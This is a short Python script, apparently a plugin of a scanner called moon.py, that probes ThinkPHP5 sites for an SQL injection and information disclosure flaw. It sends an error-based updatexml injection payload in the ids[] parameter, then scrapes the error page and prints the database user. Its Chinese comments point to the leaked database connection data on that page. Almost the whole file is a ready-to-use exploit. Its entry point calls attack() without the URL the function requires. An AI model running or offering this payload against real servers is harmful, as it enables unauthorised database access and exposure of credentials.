# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup

'''
moon.py -u thinkphp http://xxxx.xxxx.xxxx.xxxx:xx
ThinkPHP5 SQL注入漏洞 && 敏感信息泄露
启动后，访问http://your-ip/index.php?ids[]=1&ids[]=2，即可看到用户名被显示了出来。
'''


def attack(url):
    print('[+]开始检测 thinkphp5_inj_info ！')
    URL1 = url + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
    try:
        re = requests.get(URL1, verify=False, timeout=10)
    except Exception:
        print('[-]访问漏洞页面失败,未发现该漏洞！')
        print('\n')
    else:
        if re.status_code == 500 and 'SQLSTATE' in re.text:
            print('[+]存在风险页面，开始检测:', URL1)
            try:
                # print(re.text)
                soup=BeautifulSoup(re.content,"lxml")
                print('[+]获得账户数据如下，数据库连接数据请前往页面自行查找：')
                print(soup.find_all('h1')[0].get_text())
                print('[+]漏洞检测结束,存在 thinkphp5_inj_info ！')
                print('\n')
            except Exception:
                print('[-]获取数据出错！请自行访问页面判断.')
                print('\n')
        else:
            print('[-]访问漏洞页面失败,未发现该漏洞：', URL1, re.status_code)
            print('\n')


if __name__ == "__main__":
    attack()
